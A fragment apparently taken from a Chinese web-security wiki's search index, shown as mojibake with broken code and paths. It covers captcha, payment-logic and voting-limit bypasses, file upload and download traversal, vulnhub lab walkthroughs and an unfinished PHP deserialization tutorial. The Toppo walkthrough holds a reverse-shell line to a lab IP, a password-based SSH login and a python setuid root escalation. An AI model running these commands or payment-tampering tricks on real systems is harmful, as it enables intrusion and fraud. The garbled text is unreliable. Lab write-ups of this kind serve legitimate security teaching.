5.éªŒè¯å‡­è¯ä¸è¦ä¿å­˜åœ¨é¡µé¢ã€‚ 6.è¾“å…¥ç”¨æˆ·é‚®ç®±æˆ–IDã€æ‰‹æœºå·å–éªŒè¯å‡­è¯çš„åœ°æ–¹éœ€è¦è®¾ç½®éªŒè¯ç é˜²æ­¢çŸ­ä¿¡ç‚¸å¼¹å’Œæ‰¹é‡æ‰¾å›ç­‰ã€‚ 7.éªŒè¯å‡­è¯è·Ÿç”¨æˆ·åã€ç”¨æˆ·IDã€ç”¨æˆ·é‚®ç®±ç»‘å®šï¼Œæ‰¾å›å¯†ç æ—¶éªŒè¯å½“å‰å‡­è¯æ˜¯å¦æ˜¯å½“å‰ç”¨æˆ·çš„ã€‚ éªŒè¯ç æ¼æ´æ¼æ´æ¦‚å¿µï¼šéªŒè¯ç æœºåˆ¶ä¸»è¦ç”¨äºç”¨æˆ·èº«ä»½è¯†åˆ«ï¼Œå¸¸è§å¯åˆ†ä¸ºå›¾ç‰‡éªŒè¯ç ã€æ•°å­—éªŒè¯ç ã€æ»‘åŠ¨éªŒè¯ç ã€çŸ­ä¿¡éªŒè¯ç ã€é‚®ç®±éªŒè¯ç ç­‰ï¼› æ¼æ´æˆå› ï¼šæœåŠ¡ç«¯æœªå¯¹éªŒè¯æ—¶é—´ã€æ¬¡æ•°ä½œå‡ºé™åˆ¶ï¼Œå­˜åœ¨çˆ†ç ´çš„å¯èƒ½æ€§ã€‚éªŒè¯ç å¸¸ç”¨åœ¨æ‰¹é‡æ³¨å†Œï¼Œä»»æ„ç”¨æˆ·ç™»å½•åœºæ™¯ã€‚ æ¼æ´åˆ†ç±»ï¼š1ã€å‰ç«¯éªŒè¯ç»•è¿‡ åŸç†ï¼šå‰ç«¯éªŒè¯ç ç»•è¿‡ä¸€èˆ¬æ˜¯å‰ç«¯JavaScriptè„šæœ¬ç”ŸæˆéªŒè¯ç ï¼ŒéªŒè¯çš„å·¥ä½œåœ¨å‰ç«¯è¿›è¡Œï¼› æ€è·¯ï¼šç›´æ¥åˆ é™¤ç›¸å¯¹åº”çš„éƒ¨ä»½çš„ä»£ç å³å¯ï¼Œè¦æ±‚èƒ½å¤Ÿå¤§æ¦‚çœ‹æ‡‚å‰ç«¯çš„ä»£ç ï¼› 2ã€åç«¯éªŒè¯ç æœªåˆ·æ–° åŸç†ï¼šåç«¯ç»•è¿‡æƒ…å†µ1ï¼šåç«¯ä»£ç åœ¨é€»è¾‘ä¸Šå­˜åœ¨é—®é¢˜ï¼ŒéªŒè¯å¤±è´¥æ—¶ï¼ŒéªŒè¯ç ä¸è¿‡æœŸï¼Œå¯ä»¥ç»§ç»­åšè®¤è¯ï¼ˆä¹Ÿç®—ä½œé€»è¾‘æ¼æ´ï¼‰ï¼› æ€è·¯ï¼šè¿™ç±»æƒ…å†µéœ€è¦BurpæŠ“åŒ…æµ‹è¯•éªŒè¯ï¼› å®æˆ˜ï¼šä¸œå¡”æ”»é˜²ä¸–ç•Œ-åç«¯éªŒè¯ç ç»•è¿‡ 3ã€TOKENéªŒè¯å¯æå– æ€è·¯ï¼šåˆ©ç”¨burpå·¥å…·ï¼Œå¯ä»¥æ¯æ¬¡è‡ªåŠ¨æå–åå°è¿”å›çš„tokenå€¼ï¼Œç”¨äºä¸‹ä¸€æ¬¡çš„çˆ†ç ´ä½¿ç”¨ï¼› æ”¯ä»˜æ¼æ´åŸç†æ”¯ä»˜æ¼æ´ï¼Œæ˜¯ä¸€ç§å¾ˆç®€å•çš„é€»è¾‘æ¼æ´ï¼Œé€šè¿‡æŠ“åŒ…ç®€å•ä¿®æ”¹æ•°æ®åŒ…å³å¯å®ç°ã€‚ ä¸–ç•Œä¸Šçš„å…¬å¸åˆ†ä¸ºä¿©ç§ï¼Œä¸€ç§æ˜¯è¿˜æ²¡è¢«é»‘å®¢æ”»å‡»è¿‡çš„ï¼Œå¦ä¸€ç§å°±æ˜¯å·²ç»è¢« é»‘å®¢ æ”»å‡»è¿‡çš„ã€‚ æ‰€ä»¥ä¼ä¸šä¹Ÿè¶Šæ¥è¶Šé‡è§†ç½‘ç»œå®‰å…¨è¿™å—ï¼Œè¿™æ ·çš„æ”¯ä»˜æ¼æ´å°±é‚£ä¹ˆå¥½æ‰¾äº†â€¦â€¦. å•†æˆ·ç½‘ç«™æ¥å…¥æ”¯ä»˜ç»“æœæœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯é€šè¿‡æµè§ˆå™¨è¿›è¡Œè·³è½¬é€šçŸ¥ï¼Œä¸€ç§æ˜¯æœåŠ¡å™¨ç«¯å¼‚æ­¥é€šçŸ¥ï¼› Ã˜ æµè§ˆå™¨è·³è½¬ åŸºäºç”¨æˆ·è®¿é—®çš„æµè§ˆå™¨ï¼Œå¦‚æœç”¨æˆ·åœ¨é“¶è¡Œé¡µé¢æ”¯ä»˜æˆåŠŸåï¼Œç›´æ¥å…³é—­äº†é¡µé¢ï¼Œå¹¶æœªç­‰å¾…é“¶è¡Œè·³è½¬åˆ°æ”¯ä»˜ç»“æœé¡µé¢ï¼Œé‚£ä¹ˆå•†æˆ·ç½‘ç«™å°±æ”¶ä¸åˆ°æ”¯ä»˜ç»“æœçš„é€šçŸ¥ï¼Œå¯¼è‡´æ”¯ä»˜ç»“æœéš¾ä»¥å¤„ç†ã€‚è€Œä¸”æµè§ˆå™¨ç«¯æ•°æ®å¾ˆå®¹æ˜“è¢«ç¯¡æ”¹è€Œé™ä½å®‰å…¨æ€§ï¼› Ã˜ æœåŠ¡å™¨ç«¯å¼‚æ­¥é€šçŸ¥ è¯¥æ–¹å¼æ˜¯æ”¯ä»˜å…¬å¸æœåŠ¡å™¨åå°ç›´æ¥å‘ç”¨æˆ·æŒ‡å®šçš„å¼‚æ­¥é€šçŸ¥URLå‘é€å‚æ•°ï¼Œé‡‡ç”¨POSTæˆ–GETçš„æ–¹å¼ã€‚å•†æˆ·ç½‘ç«™æ¥æ”¶å¼‚éƒ¨å‚æ•°çš„URLå¯¹åº”çš„ç¨‹åºä¸­ï¼Œè¦å¯¹æ”¯ä»˜å…¬å¸è¿”å›çš„æ”¯ä»˜ç»“æœè¿›è¡Œç­¾åéªŒè¯ï¼ŒæˆåŠŸåè¿›è¡Œæ”¯ä»˜é€»è¾‘å¤„ç†ï¼Œå¦‚éªŒè¯é‡‘é¢ã€è®¢å•ä¿¡æ¯æ˜¯å¦ä¸å‘èµ·æ”¯ä»˜æ—¶ä¸€è‡´ï¼ŒéªŒè¯æ­£å¸¸åˆ™å¯¹è®¢å•è¿›è¡ŒçŠ¶æ€å¤„ç†æˆ–ä¸ºç”¨æˆ·è¿›è¡Œç½‘ç«™å†…å…¥è´¦ç­‰ï¼› åˆ†ç±»1.ä¿®æ”¹æ”¯ä»˜ä»·æ ¼ æ”¯ä»˜ä¸‰æ­¥æ›²â€”â€”è®¢è´­ã€ä¸‹å•ã€ä»˜æ¬¾ â€¢ä¸‰ä¸ªæ­¥éª¤å½“ä¸­çš„éšä¾¿ä¸€ä¸ªæ­¥éª¤è¿›è¡Œä¿®æ”¹ä»·æ ¼æµ‹è¯•ï¼Œå¦‚æœå‰é¢ä¸¤æ­¥æœ‰éªŒè¯æœºåˆ¶ï¼Œé‚£ä¹ˆä½ å¯åœ¨æœ€åä¸€æ­¥ä»˜æ¬¾æ—¶è¿›è¡ŒæŠ“åŒ…å°è¯•ä¿®æ”¹é‡‘é¢ï¼Œå¦‚æœæ²¡æœ‰åœ¨æœ€åä¸€æ­¥åšå¥½æ£€éªŒï¼Œé‚£ä¹ˆé—®é¢˜å°±ä¼šå­˜åœ¨ï¼Œå…¶ä¿®æ”¹çš„é‡‘é¢å€¼ä½ å¯ä»¥å°è¯•å°æ•°ç›®æˆ–è€…å°è¯•è´Ÿæ•°ã€‚ 2.ä¿®æ”¹è®¢å•æ•°é‡ å¾ˆç®€å•ï¼Œå°±æ˜¯æœ¬æ¥ä¸€ç¬”è®¢å•5å—é’±ï¼Œå¯ä»¥å°è¯•æŠŠè®¢å•ä¿®æ”¹ä¸ºè´Ÿæ•° 3.ä¿®æ”¹é™„å±å€¼(ä¼˜æƒ åˆ¸) ä¼˜æƒ åŠµä¸»è¦ç”¨æ¥æ‰“æŠ˜æˆ–è€…æŠµæ‰£ç°é‡‘ï¼Œä¸€èˆ¬ç”¨ä¼˜æƒ åŠµè¿›è¡Œæ¶ˆè´¹ä¸€èˆ¬å‡ºç°åœ¨ç¬¬äºŒä¸ªæ­¥éª¤å½“ä¸­ï¼šç¡®è®¤è´­ä¹°ä¿¡æ¯ï¼Œåœ¨è¿™ä¸ªæ­¥éª¤é¡µé¢å½“ä¸­ï¼Œä½ å¯ä»¥é€‰æ‹©ç›¸å…³ä¼˜æƒ åŠµï¼Œç„¶åç›´æ¥ä¿®æ”¹é‡‘é¢å¤§äºæˆ–ç­‰äºå•†å“çš„ä»·æ ¼å°±å¯ä»¥ï¼Œæˆ–è€…ç›´æ¥ä¿®æ”¹å…¶ä¸ºè´Ÿå€¼è¿›è¡Œå°è¯•ï¼Œæœ€åè¿›è¡Œæ”¯ä»˜ï¼Œå¦‚æœå¯¹è¿™ç‚¹æ²¡æœ‰åŠ ä»¥éªŒè¯ï¼Œé‚£ä¹ˆ é—®é¢˜å°±ä¼šäº§ç”Ÿï¼Œç›´æ¥æ”¯ä»˜æˆåŠŸã€‚ 4.è¶Šæƒæ”¯ä»˜ ä¾‹å¦‚ï¼šusernameXXXXXï¼Œå¦‚æœæ²¡æœ‰åŠ ä»¥éªŒè¯ï¼Œå…¶æ”¯ä»˜ä¹Ÿæ˜¯ä¸€æ¬¡æ€§æ”¯ä»˜æ²¡æœ‰è¦æ±‚è¾“å…¥å¯†ç ä»€ä¹ˆçš„æœºåˆ¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¿®æ”¹è¿™ä¸ªç”¨æˆ·IDä¸ºå…¶å®ƒç”¨æˆ·IDï¼Œè¾¾åˆ°ç”¨å…¶ä»–ç”¨æˆ·çš„è´¦å·è¿›è¡Œæ”¯ä»˜ä½ çš„å•†å“ï¼› 5.æ— é™åˆ¶è¯•ç”¨ åœ¨æ”¯ä»˜çš„æ—¶å€™å®ƒURLåé¢çš„æ”¯ä»˜æ¥å£æ˜¯3ï¼Œè€Œè¯•ç”¨æ¥å£æ˜¯4ï¼Œé‚£ä¹ˆæ­¤æ—¶ä½ å·²ç»ä½¿ç”¨è¿‡äº†ï¼Œå¤åˆ¶ä¸‹ç¡®è®¤è¯•ç”¨æ—¶çš„URLï¼Œä¿®æ”¹åé¢çš„æ”¯ä»˜æ¥å£ä¸º3ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±ä¼šè°ƒç”¨è´­ä¹°æ”¯ä»˜æ¥å£ï¼Œä½†æ˜¯ç”±äºä½ æœ¬èº«è¿™ä¸ªäº§å“å°±æ˜¯è¯•ç”¨çš„ï¼Œå…¶ç›¸åº”å€¼ç»‘å®šäº†è¿™ä¸ªè¯•ç”¨å•†å“ï¼Œé‚£ä¹ˆé‡‘é¢å°±è‚¯å®šæ˜¯0ï¼Œé‚£ä¹ˆæœ€åç‚¹å‡»æ”¯ä»˜ï¼Œä½ å°±å¯ä»¥çœ‹åˆ°æ”¯ä»˜æˆåŠŸï¼Œè¯•ç”¨æˆåŠŸï¼Œåˆé‡å¤è¯•ç”¨äº†ä¸€æ¬¡ï¼Œç„¶åä»–ä»¬çš„è¯•ç”¨æ—¶é—´ä¼šç´¯åŠ åœ¨ä¸€èµ·ï¼Œè¿™å°±å¯¼è‡´äº†å¯æ— é™åˆ¶è´­ä¹°ä»»ä½•äº§å“äº†ã€‚ 6.ä¿®æ”¹æ”¯ä»˜æ¥å£ ä¸€äº›ç½‘ç«™æ”¯æŒå¾ˆå¤šç§æ”¯ä»˜ï¼Œæ¯”å¦‚è‡ªå®¶çš„æ”¯ä»˜å·¥å…·ï¼Œç¬¬ä¸‰æ–¹çš„æ”¯ä»˜å·¥å…·ï¼Œç„¶åæ¯ä¸ªæ”¯ä»˜æ¥å£å€¼ä¸ä¸€æ ·ï¼Œå¦‚æœé€»è¾‘è®¾è®¡ä¸å½“ï¼Œå½“æˆ‘éšä¾¿é€‰æ‹©ä¸€ä¸ªç‚¹å‡»æ”¯ä»˜æ—¶è¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åä¿®æ”¹å…¶æ”¯ä»˜æ¥å£ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„æ¥å£ï¼Œå¦‚æœæ²¡åšå¥½ä¸å­˜åœ¨æ¥å£ç›¸å…³å¤„ç†ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±ä¼šæ”¯ä»˜æˆåŠŸï¼› 7.å¤šé‡æ›¿æ¢ é¦–å…ˆå»äº§ç”Ÿä¸¤ä¸ªè®¢å•ï¼Œè¿™ä¸¤ä¸ªè®¢å•å•†å“æ˜¯ä¸ä¸€æ ·çš„ï¼Œå…¶ä»·æ ¼ä¸ä¸€æ ·ï¼Œå¦‚æœæœåŠ¡ç«¯æ²¡æœ‰åšå¥½è¿™ç›¸å…³çš„éªŒè¯ï¼Œé‚£ä¹ˆåœ¨æ”¯ä»˜çš„è¿‡ç¨‹å½“ä¸­æŠ“åŒ…ï¼Œä¿®æ”¹å…¶è®¢å•å€¼ä¸ºå¦ä¸€ä¸ªè®¢å•å€¼ï¼Œæœ€åæ”¯ä»˜ï¼Œè¿™æ—¶å°±å¯ä»¥ç”¨è®¢å•ä¸€çš„æ”¯ä»˜ä»·æ ¼ä¹°åˆ°è®¢å•è€Œçš„å•†å“ï¼› é˜²å¾¡Ã˜ åç«¯æ£€æŸ¥æ¯ä¸€é¡¹å€¼ï¼ŒåŒ…æ‹¬æ”¯ä»˜çŠ¶æ€ï¼› Ã˜ æ ¡éªŒä»·æ ¼ã€æ•°é‡å‚æ•°ï¼Œæ¯”å¦‚äº§å“æ•°é‡åªèƒ½ä¸ºæ­£æ•´æ•°ï¼Œå¹¶é™åˆ¶è´­ä¹°æ•°é‡ï¼› Ã˜ ä¸ç¬¬ä¸‰æ–¹æ”¯ä»˜å¹³å°æ£€æŸ¥ï¼Œå®é™…æ”¯ä»˜çš„é‡‘é¢æ˜¯å¦ä¸è®¢å•é‡‘é¢ä¸€è‡´ï¼› Ã˜ æ”¯ä»˜å‚æ•°è¿›è¡ŒMD5 åŠ å¯†ã€è§£å¯†ã€æ•°å­—ç­¾ååŠéªŒè¯ï¼Œè¿™ä¸ªå¯ä»¥æœ‰æ•ˆçš„é¿å…æ•°æ®ä¿®æ”¹ï¼Œé‡æ”¾æ”»å‡»ä¸­çš„å„ç§é—®é¢˜ï¼› Ã˜ é‡‘é¢è¶…è¿‡é˜ˆå€¼ï¼Œè¿›è¡Œäººå·¥å®¡æ ¸ ï¼› æŠ•ç¥¨ç§¯åˆ†æŠ½å¥–æ¼æ´æŠ•ç¥¨å’ŒæŠ½å¥–ä»¥åŠç§¯åˆ†åœ¨å¾ˆå¤šä¿ƒé”€æ´»åŠ¨æˆ–è€…æ¨å¹¿æ‰‹æ®µä¸Šéƒ½ç»å¸¸ç”¨åˆ°ï¼ŒèƒŒåçš„å¥–å“æˆæœ¬å¯èƒ½ä¸Šæ•°åä¸‡ï¼Œå¦‚æœè¿™äº›å¥–å“è¢«æ¶æ„ç”¨æˆ·åˆ·èµ°äº†ï¼Œä¸ä»…æ¨å¹¿çš„æ•ˆæœæ²¡æœ‰ï¼Œè€Œä¸”æµªè´¹äº†æˆæœ¬æŠ•å…¥ã€‚ ä¸ç®¡æ˜¯æŠ•ç¥¨ã€ç§¯åˆ†è¿˜æ˜¯æŠ½å¥–ï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªå…¬å…±ç‚¹ï¼šå³å•ä¸ªç”¨æˆ·æ¬¡æ•°å­˜åœ¨é™åˆ¶ï¼Œæ¯”å¦‚ä¸€åœºæ´»åŠ¨ä¸­ä¸€ä¸ªç”¨æˆ·åªèƒ½æŠ½å¥–ä¸€æ¬¡ã€‚è¿™æ ·çš„é™åˆ¶ä¹Ÿä¼šå­˜åœ¨å¾ˆå¤šç»•è¿‡æ–¹å¼ã€‚ åˆ©ç”¨æ–¹æ³•1.cookieå’ŒPOSTè¯·æ±‚æ­£æ–‡ç»•è¿‡ æœ‰çš„åº”ç”¨å°†éªŒè¯æ˜¯å¦æŠ½å¥–æˆ–è€…é¢†å–ç§¯åˆ†çš„åˆ¤æ–­å€¼æ”¾ç½®åœ¨cookieæˆ–è€…POSTçš„è¯·æ±‚æ­£æ–‡é‡Œï¼ŒæœåŠ¡å™¨ç«¯è·å–åˆ°è¿™ä¸ªç»“æœååˆ¤æ–­æ˜¯å¦è¿˜æœ‰æœºä¼šæŠ½å¥–ï¼Œè€Œè¿™ä¸ªæ•°æ®æˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥åœ¨æ•°æ®åŒ…ä¸­ä¿®æ”¹çš„ï¼Œæ‰€ä»¥å°±ä¼šäº§ç”Ÿç»•è¿‡ï¼Œæ¯”å¦‚cookieä¸­isok1ä»£è¡¨å·²ç»æŠ½å¥–ï¼Œisok0ä»£è¡¨è¿˜æ²¡æœ‰æŠ½å¥–ï¼Œ è€Œæˆ‘ä»¬åªè¦å†ç‚¹å‡»æŠ½å¥–ï¼Œç„¶åæŠŠisokçš„å€¼æ”¹ä¸º0å³å¯ä¸€ç›´æŠ½å¥–ã€‚ 2.åŸºäºIPéªŒè¯ åšçš„æ¯”è¾ƒå¼±çš„ç»Ÿè®¡æ˜¯ç›´æ¥åŸºäºIPéªŒè¯ï¼Œåƒè®¿é—®é‡ã€æ¨å¹¿è·å–ç§¯åˆ†ç­‰ï¼Œè¿™ç±»è¦çœ‹ç¨‹åºè·å–IPçš„æ–¹å¼ï¼Œå¦‚æœæ˜¯client-ipæˆ–è€…x_forword_forè·å–IPï¼Œåˆ™å¯ä»¥ç›´æ¥ä¼ªé€ IPç»•è¿‡ã€‚ 3.åŸºäºç”¨æˆ·è®¤è¯ ä¹Ÿæœ‰ä¸€éƒ¨åˆ†åº”ç”¨éœ€è¦ç™»é™†ä»¥åæ‰èƒ½æŠ½å¥–æˆ–è€…æŠ•ç¥¨ï¼Œè¿™ç±»å¯ä»¥ç»“åˆçœ‹çœ‹èƒ½ä¸èƒ½æ‰¹é‡æ³¨å†Œï¼Œå¦‚æœå¯ä»¥ï¼Œåˆ™å¯ä»¥ç”¨ç¨‹åºå®ç°æ‰¹é‡ç™»é™†åˆ·ç¥¨ï¼Œæˆ–è€…æŠ•ç¥¨çš„æ—¶å€™POSTåŒ…æˆ–è€…cookieé‡Œé¢çš„å½“å‰uid\\ ç”¨æˆ·åç­‰æ˜¯å¦å¯ä»¥éšæ„ä¿®æ”¹ç»•è¿‡ç”¨æˆ·å•æ¬¡é™åˆ¶ã€‚ é˜²å¾¡æ–¹æ³•ä»ä¸Šé¢åˆ©ç”¨æ‰‹æ®µå¯ä»¥çœ‹åˆ°ä¸»è¦çš„ä¸‰ä¸ªç‚¹æ˜¯IPã€ç™»å½•ç”¨æˆ·å’Œcookieã€åˆ†æå‡ºå¯ç”¨æ€§è¾ƒé«˜çš„é˜²å¾¡ æ‰‹æ®µå¦‚ä¸‹ï¼š Ã˜ æœºå™¨è¯†åˆ«ç éªŒè¯ï¼Œæ¯å°æœºå™¨éƒ½å¯ä»¥æ ¹æ®ç¡¬ä»¶ä¿¡æ¯ç”Ÿæˆå”¯ä¸€çš„è¯†åˆ«ç ã€‚ Ã˜ æ“ä½œéœ€è¦ç™»é™†ï¼Œå½“å‰ç”¨æˆ·ä¿¡æ¯ä»sessionä¸­è¯»å–ã€‚"},{"title":"æ–‡ä»¶ä¸Šä¼ ","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ–‡ä»¶ä¸Šä¼ /æ–‡ä»¶ä¸Šä¼ .html","content":"æ–‡ä»¶ä¸Šä¼  http:ç›®æ ‡ç½‘ç«™include.php?fileuploadmerged.gif æ–‡ä»¶å¤´å¯¹ç…§è¡¨ï¼š ç±»å‹ é­”æ•°ï¼ˆHexï¼‰ ASCII è¡¨ç° GIF 47 49 46 38 GIF89a JPEG FF D8 Ã¿Ã˜ PNG 89 50 4E 47 â€°PNG"},{"title":"æ–‡ä»¶ä¸‹è½½","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ–‡ä»¶ä¸‹è½½/æ–‡ä»¶ä¸‹è½½.html","content":"æ£€æµ‹å‚æ•°å€¼åæ¥ä¸Šæ˜¯å¦ä¸ºæ–‡ä»¶æˆ–æ–‡ä»¶é“¾æ¥read.xxx?filenamedown.xxx?filenamereadfile.xxx?filedownfile.xxx?file.. ..\\ . .ç­‰%00 ? %23 %20 .ç­‰readpathã€filepathã€pathã€inputpathã€urlã€dataã€readfileã€menuã€META-INFã€WEB-INFã€"},{"title":"Toppo","path":"/wiki/WP/Windowsææƒ/vulnhub/Toppo.html","content":"å‰æ kali ip 192.168.129.152 é¶æœº NAT æ¨¡å¼ ä¿¡æ¯æ”¶é›†æ£€æµ‹ipnmap -sP 192.168.129.024 ip æ˜¯192.168.129.165 æ£€æµ‹ç«¯å£nmap -sT -sV -Pn 192.168.129.165 -p- -A æ‰«çš„å¤ªæ…¢äº†çš„è¯ï¼Œæ¢è¿™ä¸ªnmap -sS -sV -Pn 192.168.129.165 -p- -A -sS å°±æ˜¯ TCP SYN åŠè¿æ¥æ‰«æ 22,80,111ç«¯å£å¼€æ”¾ æ¸—é€æµ‹è¯•å…ˆçœ‹æ¯”è¾ƒé‡è¦çš„80ç«¯å£ 80ç«¯å£æœåŠ¡å™¨æ˜¯Apache 2.4.10 åšå®¢æ˜¯start Bootstrap æ­å»ºçš„ æœç´¢Apacheå†å²æ¼æ´ è¿™æœ‰ç‚¹å¤šäº†ï¼Œeholeæ£€æµ‹ä¸€ä¸‹æŒ‡çº¹ä¿¡æ¯ï¼Œç¼©å°é€‰é¡¹ ç¼©å°ä¸äº†ï¼Œå…ˆçœ‹åªæœ‰Apacheçš„ï¼Œ è²Œä¼¼å¤±è´¥äº† searchsploit Bootstrap åªæœ‰xssï¼Œè²Œä¼¼ä¸èƒ½getshell ç›®å½•æ‰«æä¸€æ³¢python dirsearch.py -u http://192.168.129.165/ æœ‰ä¸ªadminç›®å½•ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ æŸ¥çœ‹notes.txt æœ‰ä¸€ä¸ªå¯†ç ï¼Œç„¶åå°è¯•è®¿é—®ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰ç™»é™†å¤„mailé‡Œä»€ä¹ˆéƒ½æ²¡æœ‰ http://192.168.129.165/vendor/ è¿™ä¸ªå¥½åƒæ˜¯ä¸ªç›®å½•,ç›®å½•ç©¿è¶Šå¤±è´¥ http://192.168.129.165/manual/en/index.html ok,ç½‘é¡µç«¯æ²¡æœ‰ç™»é™†ç•Œé¢111ç«¯å£searchsploit rpcbind å¥½åƒéƒ½æ˜¯dosæ”»å‡» æ²¡æƒ³åˆ°è¿˜æœ‰ä¸€ä¸ªsshç™»å½•ï¼Œå°è¯•ä¸€ä¸‹å¯†ç æ˜¯12345ted123ï¼Œè´¦å·å¯èƒ½æ˜¯tedå°è¯•ç™»é™† ç™»é™†æˆåŠŸ ææƒ è¿™ä¸ªå°±ä¸ç”¨åå¼¹shelläº†ï¼Œå½“ç„¶ï¼Œæ„¿æ„çš„è¯ä¹Ÿå¯ä»¥sh -i devtcp192.168.129.1525555 01 å°è¯•sudoææƒ æŸ¥çœ‹etcpasswdåªæœ‰ä¸€ä¸ªç”¨æˆ· suidå°è¯•æŸ¥çœ‹æ˜¯å¦æœ‰ç‰¹æƒæ–‡ä»¶find -perm -us -type f 2devnull å°è¯•python2.7ææƒusrbinpython2.7 -c â€˜import os; os.setuid(0); os.system(â€œbinbashâ€)â€™"},{"title":"GeminiInc v1","path":"/wiki/WP/Windowsææƒ/vulnhub/GeminiInc v1.html","content":"å‰æ kali 192.168.129.152 é¶æœº NATæ¨¡å¼ ä¿¡æ¯æ”¶é›†ipæ£€æµ‹ nmap -sP 192.168.129.024 ip ä¸º 192.168.129.166 ç«¯å£æ£€æµ‹nmap -sT -sV -Pn 192.168.129.166 -p- -A åªå¼€æ”¾äº†22,80 æ¸—é€æµ‹è¯•ææƒ"},{"title":"phpååºåˆ—åŒ–","path":"/wiki/WP/ååºåˆ—åŒ–/php/phpååºåˆ—åŒ–.html","content":"PHPååºåˆ—åŒ–è¿™ä¸€ç¯‡å°±å¤Ÿäº†ç®€ä»‹åºåˆ—åŒ–å…¶å®å°±æ˜¯å°†æ•°æ®è½¬åŒ–æˆä¸€ç§å¯é€†çš„æ•°æ®ç»“æ„ï¼Œè‡ªç„¶ï¼Œé€†å‘çš„è¿‡ç¨‹å°±å«åšååºåˆ—åŒ–ã€‚ åœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒå½¢è±¡çš„ä¾‹å­ æ¯”å¦‚ï¼šç°åœ¨æˆ‘ä»¬éƒ½ä¼šåœ¨æ·˜å®ä¸Šä¹°æ¡Œå­ï¼Œæ¡Œå­è¿™ç§å¾ˆä¸è§„åˆ™çš„ä¸œè¥¿ï¼Œè¯¥æ€ä¹ˆä»ä¸€ä¸ªåŸå¸‚è¿è¾“åˆ°å¦ä¸€ä¸ªåŸå¸‚ï¼Œè¿™æ—¶å€™ä¸€èˆ¬éƒ½ä¼šæŠŠå®ƒæ‹†æ‰æˆæ¿å­ï¼Œå†è£…åˆ°ç®±å­é‡Œé¢ï¼Œå°±å¯ä»¥å¿«é€’å¯„å‡ºå»äº†ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±ç±»ä¼¼æˆ‘ä»¬çš„åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼ˆæŠŠæ•°æ®è½¬åŒ–ä¸ºå¯ä»¥å­˜å‚¨æˆ–è€…ä¼ è¾“çš„å½¢å¼ï¼‰ã€‚å½“ä¹°å®¶æ”¶åˆ°è´§åï¼Œå°±éœ€è¦è‡ªå·±æŠŠè¿™äº›æ¿å­ç»„è£…æˆæ¡Œå­çš„æ ·å­ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±åƒååºåˆ—çš„è¿‡ç¨‹ï¼ˆè½¬åŒ–æˆå½“åˆçš„æ•°æ®å¯¹è±¡ï¼‰ã€‚ php å°†æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¼šç”¨åˆ°ä¸¤ä¸ªå‡½æ•° serialize å°†å¯¹è±¡æ ¼å¼åŒ–æˆæœ‰åºçš„å­—ç¬¦ä¸² unserialize å°†å­—ç¬¦ä¸²è¿˜åŸæˆåŸæ¥çš„å¯¹è±¡ åºåˆ—åŒ–çš„ç›®çš„æ˜¯æ–¹ä¾¿æ•°æ®çš„ä¼ è¾“å’Œå­˜å‚¨ï¼Œåœ¨PHPä¸­ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸€èˆ¬ç”¨åšç¼“å­˜ï¼Œæ¯”å¦‚sessionç¼“å­˜ï¼Œcookieç­‰ã€‚ å¸¸è§çš„åºåˆ—åŒ–æ ¼å¼äº†è§£å³å¯ äºŒè¿›åˆ¶æ ¼å¼ å­—èŠ‚æ•°ç»„ jsonå­—ç¬¦ä¸² xmlå­—ç¬¦ä¸² æ¡ˆä¾‹å¼•å…¥ç®€å•çš„ä¾‹å­(ä»¥æ•°ç»„ä¸ºä¾‹å­) ?php$user=array(xiao,shi,zi);$user=serialize($user);echo($user.PHP_EOL);print_r(unserialize($user)); ä»–ä¼šè¾“å‡º a:3:i:0;s:4:xiao;i:1;s:3:shi;i:2;s:2:zi;Array( [0] = xiao [1] = shi [2] = zi) æˆ‘ä»¬å¯¹ä¸Šé¢è¿™ä¸ªä¾‹å­åšä¸ªç®€å•è®²è§£ï¼Œæ–¹ä¾¿å¤§å®¶å…¥é—¨ a:3:i:0;s:4:xiao;i:1;s:3:shi;i:2;s:2:zi;a:arrayä»£è¡¨æ˜¯æ•°ç»„ï¼Œåé¢çš„3è¯´æ˜æœ‰ä¸‰ä¸ªå±æ€§i:ä»£è¡¨æ˜¯æ•´å‹æ•°æ®intï¼Œåé¢çš„0æ˜¯æ•°ç»„ä¸‹æ ‡s:ä»£è¡¨æ˜¯å­—ç¬¦ä¸²ï¼Œåé¢çš„4æ˜¯å› ä¸ºxiaoé•¿åº¦ä¸º4 ä¾æ¬¡ç±»æ¨ åºåˆ—åŒ–åçš„å†…å®¹åªæœ‰æˆå‘˜å˜é‡ï¼Œæ²¡æœ‰æˆå‘˜å‡½æ•°ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ ?phpclass test public $a; public $b; function __construct()$this-a = xiaoshizi;$this-b=laoshizi; function happy()return $this-a;$a = new test();echo serialize($a);? è¾“å‡º(Oä»£è¡¨Objectæ˜¯å¯¹è±¡çš„æ„æ€ï¼Œä¹Ÿæ˜¯ç±») O:4:test:2:s:1:a;s:9:xiaoshizi;s:1:b;s:8:laoshizi; è€Œå¦‚æœå˜é‡å‰æ˜¯protectedï¼Œåˆ™ä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\\x00*\\x00,privateåˆ™ä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\\x00ç±»å\\x00,è¾“å‡ºæ—¶ä¸€èˆ¬éœ€è¦urlç¼–ç ï¼Œè‹¥åœ¨æœ¬åœ°å­˜å‚¨æ›´æ¨èé‡‡ç”¨base64ç¼–ç çš„å½¢å¼ï¼Œå¦‚ä¸‹ï¼š ?phpclass test protected $a; private $b; function __construct()$this-a = xiaoshizi;$this-b=laoshizi; function happy()return $this-a;$a = new test();echo serialize($a);echo 